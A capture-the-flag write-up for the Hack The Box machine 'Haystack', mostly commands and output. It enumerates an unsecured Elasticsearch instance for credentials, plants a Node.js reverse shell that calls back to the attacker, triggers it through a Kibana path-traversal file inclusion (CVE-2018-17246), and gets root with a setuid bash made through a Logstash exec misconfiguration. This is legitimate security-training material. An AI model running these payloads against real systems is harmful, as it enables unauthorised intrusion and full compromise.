# Target
| Category          | Details                                                  |
|-------------------|----------------------------------------------------------|
| 📝 **Name**       | [Haystack](https://app.hackthebox.com/machines/Haystack) |  
| 🏷 **Type**       | HTB Machine                                              |
| 🖥️ **OS**        | Linux                                                    |
| 🎯 **Difficulty** | Easy                                                     |

# Attack path
1. [Enumerate unsecured Elasticsearch instance](#enumerate-unsecured-elasticsearch-instance)
2. [Escalate to `kibana` user using arbitrary file inclusion in Kibana 6.4.2 (CVE-2018-17246)](#escalate-to-kibana-user-using-arbitrary-file-inclusion-in-kibana-642-cve-2018-17246)
3. [Escalate to `root` user using Logstash misconfiguration](#escalate-to-root-user-using-logstash-misconfiguration)

### Enumerate unsecured Elasticsearch instance

#### List available indices
```
┌──(magicrc㉿perun)-[~/attack/HTB Haystack]
└─$ curl http://$TARGET:9200/_cat/indices?v
health status index   uuid                   pri rep docs.count docs.deleted store.size pri.store.size
green  open   .kibana 6tjAYZrgQ5CwwR0g6VOoRg   1   0          1            0        4kb            4kb
yellow open   quotes  ZG2D1IqkQNiNZmi2HRImnQ   5   1        253            0    262.7kb        262.7kb
yellow open   bank    eSVpNfCfREyYoVigNWcrMw   5   1       1000            0    483.2kb        483.2kb
```

#### Search for credentials in `quote` index
```
┌──(magicrc㉿perun)-[~/attack/HTB Haystack]
└─$ curl -s "http://$TARGET:9200/quotes/_search?size=253&pretty" | \
jq -r ".hits.hits[]._source.quote" | \
tr -s '[:space:]' '\n' | \
sort -u | less
```

#### Decode base64 encoded credentials
```
┌──(magicrc㉿perun)-[~/attack/HTB Haystack]
└─$ echo "dXNlcjogc2VjdXJpdHkg" | base64 -d && \
echo && \
echo "cGFzczogc3BhbmlzaC5pcy5rZXk=" | base64 -d
user: security 
pass: spanish.is.key
```

### Escalate to `kibana` user using arbitrary file inclusion in Kibana 6.4.2 ([CVE-2018-17246](https://nvd.nist.gov/vuln/detail/cve-2018-17246))

#### Upload reverse shell over SSH using discovered credentials
```
┌──(magicrc㉿perun)-[~/attack/HTB Haystack]
└─$ LHOST=$(ip addr show tun0 | grep "inet " | awk '{print $2}' | cut -d'/' -f1) && \
LPORT=4444 && \
(cat <<EOF> shell.js
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect($LPORT, "$LHOST", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/;
})();
EOF
) &&
scp shell.js security@$TARGET:/tmp/shell.js
```

#### Listen for reverse shell connection
```
┌──(magicrc㉿perun)-[~/attack/HTB Haystack]
└─$ nc -lnvp 4444      
listening on [any] 4444 ...
```

#### Setup SSH tunnel to local Kibana port using discovered credentials
```
┌──(magicrc㉿perun)-[~/attack/HTB Haystack]
└─$ ssh -L 5601:localhost:5601 -Nf security@$TARGET
security@10.129.227.120's password:
```

#### Execute uploaded reverse shell code (exploit arbitrary file inclusion)
```
┌──(magicrc㉿perun)-[~/attack/HTB Haystack]
└─$ curl "http://127.0.0.1:5601/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../../tmp/shell"
```

#### Confirm escalation
```
connect to [10.10.14.161] from (UNKNOWN) [10.129.227.120] 36542
id
uid=994(kibana) gid=992(kibana) grupos=992(kibana) contexto=system_u:system_r:unconfined_service_t:s0
```

### Escalate to `root` user using Logstash misconfiguration
#### Identify misconfiguration
```
cat /etc/logstash/conf.d/*
filter {
        if [type] == "execute" {
                grok {
                        match => { "message" => "Ejecutar\s*comando\s*:\s+%{GREEDYDATA:comando}" }
                }
        }
}
input {
        file {
                path => "/opt/kibana/logstash_*"
                start_position => "beginning"
                sincedb_path => "/dev/null"
                stat_interval => "10 second"
                type => "execute"
                mode => "read"
        }
}
output {
        if [type] == "execute" {
                stdout { codec => json }
                exec {
                        command => "%{comando} &"
                }
        }
}
```

#### Exploit misconfiguration
```
echo "Ejecutar comando: cp /bin/bash /tmp/root_shell; chmod +s /tmp/root_shell" > /opt/kibana/logstash_1 && \
while [ ! -f /tmp/root_shell ]; do sleep 1; done && /tmp/root_shell -p
id
uid=994(kibana) gid=992(kibana) euid=0(root) egid=0(root) grupos=0(root),992(kibana) contexto=system_u:system_r:unconfined_service_t:s0
```